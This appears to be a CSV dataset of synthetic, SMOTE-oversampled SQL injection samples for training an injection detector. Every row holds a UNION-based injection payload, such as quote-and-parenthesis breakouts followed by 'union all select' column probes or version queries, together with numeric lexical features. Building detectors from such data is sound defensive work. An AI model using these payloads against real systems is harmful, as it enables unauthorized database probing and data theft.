id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000256,attack,union,"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#",nearest_attack_euclidean,R000453,0.2152273513524865,85.15317596832665,27.384682403167332,3.9843655444657653,25.0,28.92254077466133,22.0,9.230635193665332,0.2945769592933912,0.3381033278279626,0.25922772417818424,0.10809198870046194,1.0,0.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,3.2306351936653317,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000257,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000891,0.25645923048533276,74.96829079275271,16.0,3.101653131630225,48.37463263420217,1.0,14.0,11.593658158550543,0.6450995983398145,0.013353482901740127,0.18694876062436183,0.15459815813408356,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,7.593658158550543,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000258,attack,union,"-1170' union all select 4663,4663,4663,4663,4663,4663,4663,4663#",nearest_attack_euclidean,R000913,0.16780978759064943,64.0,20.24964535476528,3.6464823803857573,14.0,36.0,4.0,10.0,0.21875000000000003,0.5625,0.0625,0.15625,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000259,attack,union,"-4770   )    )     )   union all select 6356,6356,6356,6356,6356#",nearest_attack_euclidean,R001210,0.1315606571471612,64.17470919706345,20.83494183941269,3.6259655300897022,14.0,23.339767357650757,18.0,8.83494183941269,0.21861652342408722,0.3627669531518256,0.2810783872595407,0.13753813616454652,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,3.8349418394126893,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000260,attack,union,"-2857%'   )    )     )   union all select 7167,7167,7167,7167,7167,7167,7167,7167#",nearest_attack_euclidean,R000871,0.10267133306371631,82.56467793866213,23.112935587732427,3.6286724430664914,14.0,36.4517423509297,18.0,14.112935587732427,0.16962356446015286,0.44136732085567687,0.21808744002019648,0.17092167466397382,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,7.112935587732425,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000261,attack,union,"-7860'   )    )     )   union all select 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--",nearest_attack_euclidean,R000423,0.2708356483576232,89.881798333239,21.0,3.6734494117149965,14.0,42.3054386665912,18.0,15.5763596666478,0.15587891346010174,0.47042744011292786,0.20041574587727362,0.17327790054969686,1.0,0.0,3.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,8.5763596666478,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000262,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R001567,0.005406165168934444,99.04186720146564,29.006280080219845,4.189979827240336,37.0,32.0334937611725,17.0,13.008373440293125,0.3736058835027393,0.3234000621262353,0.17165675728504237,0.13133729708598305,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.008373440293125,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000263,attack,union,"1%""   )    )    union all select null,null--",nearest_attack_euclidean,R001399,0.7430134656821915,48.76817437239792,17.0,3.327044800875661,23.90726974895917,1.0,15.907269748959168,7.953634874479584,0.49117004745852233,0.020720465331482335,0.32540632480666354,0.16270316240333177,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.4768174372397924,1.0,0.0,1.476817437239792,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000264,attack,union,"-4045 union all select 6857,6857,6857,6857,6857,6857,6857--",nearest_attack_euclidean,R000437,0.17792206312708073,59.69949376819801,18.860101246360397,3.764233141982397,14.0,32.559595014558404,4.0,9.139898753639601,0.2346946735289269,0.5451886401685937,0.06705562100826482,0.15306106529421462,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.139898753639601,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000265,attack,union,"-5706""   )    )    union all select 2013,2013,2013,2013#",nearest_attack_euclidean,R000422,0.20126991752741458,54.90707364318046,23.0,3.9134715307564996,14.0,19.12565891454437,14.0,7.781414728636093,0.25692734458228017,0.3448715610256752,0.25692734458228017,0.14127374980976454,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.7814147286360926,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000266,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000376,0.021297043016775898,91.91451709586337,18.971505698621126,3.368909573475366,66.87652469402488,1.0,11.028494301378874,13.009498100459624,0.7275232617112942,0.010880759940300772,0.12003166417919843,0.1415643141692066,1.0,0.0,2.0,0.0,0.0,0.0,0.0,1.0094981004596244,0.0,0.0,9.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000267,attack,union," select * from users where id  =  '1' +   (  \  )   union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000173,0.006115640486743092,82.0110228577173,34.01102285771729,4.211535299354943,40.0,3.0,25.0,14.011022857717297,0.48774009487089454,0.0365805071153171,0.30483755929430906,0.17084183871947933,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000268,attack,union," select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",nearest_attack_euclidean,R000131,1.030012175537151,71.90761761836022,33.0,4.432565557158132,40.0,2.476904404590055,16.43071321377016,13.0,0.5566979334489559,0.034279550788529595,0.22809568739160385,0.18092682837091068,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.5230955954099467,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000269,attack,union,"-5300' union all select 2750,2750,2750,2750,2750,2750--",nearest_attack_euclidean,R000586,0.0236482239185035,55.0,19.056891455905852,3.828246775476288,14.0,28.0,4.0,9.0,0.2545454545454545,0.509090909090909,0.07272727272727271,0.16363636363636364,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000270,attack,union,"-7202%""   )    )    union all select 2901#",nearest_attack_euclidean,R001374,1.051428246602562,38.944600006247356,21.87297142678647,3.8939826837581677,14.0,8.0,11.381085719640591,5.5635142866067655,0.3624323808928823,0.2071042176530756,0.2876062585968992,0.14285714285714285,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.563514286606765,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000271,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R001483,0.17003450698710024,65.80766628338695,20.23846674332261,3.798297551074041,14.0,27.046133026709562,14.0,10.76153325667739,0.21297368127890773,0.4105624113757116,0.21297368127890773,0.16349022606647295,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,4.76153325667739,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000272,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001017,0.24108198119861865,81.10728313832934,15.0,3.05097406633132,50.0,1.0,17.28582651066347,12.821456627665867,0.6168254423635624,0.012336508847271277,0.21278217886988857,0.15805586991927775,0.0,0.0,2.0,0.0,0.0,0.0,0.0,2.8214566276658672,0.0,0.0,8.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000273,attack,union," select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000147,0.27873884258668974,83.0,28.4577456427685,3.973352388077161,43.0,3.542254357231501,25.0,11.4577456427685,0.5180722891566265,0.042677763340138564,0.30120481927710846,0.13804512822612652,2.0,1.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.0,1.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000274,attack,union,"1%""   )    )    union all select null#",nearest_attack_euclidean,R001034,0.6372143151735561,42.61443460746026,16.307628973830685,3.2510089135183144,20.46103179064547,1.0,15.230515895322737,5.9228869214920525,0.47887754970717145,0.024024610423306697,0.3595618269701193,0.1375360128994025,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.307628973830684,1.0,0.0,0.6152579476613682,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000275,attack,union,"-5150   )    )     )   union all select 5660,5660,5660#",nearest_attack_euclidean,R000797,0.11564148345691593,54.671020310405396,19.13159187583784,3.516942591686243,14.0,16.0,17.736816248324317,6.934204062081079,0.25622026023793615,0.2928231545576413,0.32416237384383284,0.12679421136058966,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.934204062081079,0.0,0.0,2.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000276,attack,union,"1""  )   where 2388  =  2388 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001577,0.048179669272886215,91.50340458023665,23.077446858497947,3.6226790279844403,55.38723429248974,9.0,14.077446858497947,13.038723429248973,0.605193477251009,0.0984223751878561,0.15384615384615385,0.142537993714981,0.0,1.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,8.038723429248972,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000277,attack,union,"-7142'   )    )    union all select 5083,5083,5083,5083#",nearest_attack_euclidean,R000758,0.38594720119945847,57.741662539495564,23.303334984201776,3.921150073961301,14.0,21.39333003159645,14.0,8.348332507899112,0.24286203877255919,0.36978724560289516,0.24286203877255919,0.14448867685198646,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,3.348332507899112,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000278,attack,union,"1'+  (  select 'fxhh' where 2571  =  2571 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000915,0.06256342712987198,94.52621868215131,26.063170842379826,3.9915741577757897,56.62097494572105,9.0,15.0,13.905243736430263,0.5988155467053783,0.09529789892903137,0.15882983154838556,0.1470567228172048,3.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.905243736430263,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000279,attack,union," select * from users where id  =  '1' *1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000185,1.0398905174885145,100.93729893761066,26.0,4.080640071191791,62.0,4.645766312536887,23.645766312536885,10.645766312536885,0.6143679407672944,0.045967683619598826,0.23424172998376971,0.10542264562933701,3.0,0.0,2.0,0.0,1.645766312536886,2.0,0.0,0.0,0.0,0.0,1.0,5.645766312536886,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000280,attack,union,"-1487""  )   as crfi where 2407  =  2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",nearest_attack_euclidean,R000944,0.016222607294262014,108.01916397938601,26.019163979386004,3.936258861273808,25.0,51.961672041227985,16.057491938158012,15.0,0.23144115324203282,0.4810491627545918,0.14864499205815565,0.1388646919452197,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.009581989693002,0.0,0.0,8.990418010307,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000281,attack,union,-5970' where 2769  =  2769 union all select 2769--,nearest_attack_euclidean,R001219,0.4633710999214198,49.81001847670331,22.810018476703313,4.067475392339998,19.0,16.0,10.0,4.810018476703312,0.38147332609903556,0.3212406956623457,0.2007754347889661,0.09651054344965265,0.8100184767033114,0.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,4.0,0.8100184767033112,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000282,attack,union,-6165%'   )    )    union all select 5384#,nearest_attack_euclidean,R000407,0.4575406104550398,43.416462311540144,21.71670753769197,3.702355584425307,14.0,8.0,15.133169849232115,6.283292462308028,0.32328750133659473,0.1847357150494827,0.34739749812876736,0.14457928548515517,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.2832924623080286,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000283,attack,union,"1 where 9869  =  9869 union all select null,null#",nearest_attack_euclidean,R001411,0.28714369351327523,47.456811281533106,20.691362256306622,3.8652652651634187,25.765449025226488,9.0,10.0,2.691362256306622,0.5422880786802894,0.19011535179322914,0.21123927977025458,0.05635728975622688,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.691362256306622,1.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000284,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R001256,0.5128945984285805,59.383356696176016,21.0,3.77087167407769,14.0,23.50668535694081,14.0,7.876671339235203,0.23737986188910093,0.3930630939043984,0.2373798618891009,0.13217718231739972,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,3.8766713392352026,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000285,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000988,0.4743903773525672,65.14736255335436,21.23771978722047,3.7326248102392277,14.0,27.04912085111812,12.57368127667718,11.52456042555906,0.21636999061266776,0.4157599964238734,0.19090001341047458,0.1769699995529842,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.76228021277953,1.0,0.0,4.76228021277953,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000286,attack,union,"1%""   )    )    union all select null,null,null,null--",nearest_attack_euclidean,R000323,0.12862022531054595,53.201534017765134,17.0,3.3599450441023304,29.361227214212107,1.0,14.0,8.840306803553027,0.5497960045086475,0.01895484814328427,0.26536787400597994,0.16588127334208827,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,2.840306803553027,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000287,attack,union,"-5581%'   )    )     )   union all select 4266,4266,4266,4266,4266,4266,4266,4266,4266,4266#",nearest_attack_euclidean,R001574,0.851530508666722,87.32385306119305,22.06477061223861,3.4282062378143077,14.0,42.12954122447722,16.12954122447722,15.064770612238611,0.16085181033182627,0.48272378817065353,0.18399899755440474,0.1724254039431155,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.5323853061193047,1.0,0.0,8.532385306119306,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000288,attack,union,"-3666""   )    )     )   union all select 4136,4136,4136--",nearest_attack_euclidean,R000512,0.13570325867934502,57.0,19.425096614949506,3.6139071015263347,14.0,16.0,18.0,9.0,0.24561403508771928,0.2807017543859649,0.3157894736842105,0.15789473684210525,0.0,1.0,3.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,2.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000289,attack,union,union all select @@version--,nearest_attack_euclidean,R000128,0.8035071969635416,28.95059835622523,15.0,3.6919763041119755,21.316866118741743,0.31686611874174275,3.3168661187417428,4.0,0.7372231403733169,0.01022148770134651,0.11407886665448512,0.13847650527085148,0.3168661187417415,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.31686611874174186,2.0,0.31686611874174164,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
